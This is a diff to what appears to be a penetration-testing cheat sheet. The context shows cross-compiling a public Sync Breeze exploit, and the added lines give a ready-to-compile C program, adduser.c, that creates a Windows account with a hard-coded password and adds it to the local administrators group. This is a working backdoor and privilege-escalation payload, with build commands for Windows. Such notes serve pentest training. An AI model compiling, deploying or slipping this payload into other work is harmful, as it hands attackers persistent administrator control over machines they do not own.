@@ -1307,7 +1307,28 @@ sudo apt install mingw-w64
 i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
 #  when the linker cannot find the winsock library
 i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
+
+
+
+############## adduser.c ####################################
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+#############################################################
+
+# Cross compile adduser.c code to 64-bit applcation
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+
 ```
+
 
 ### xfreerdp
 ```bash
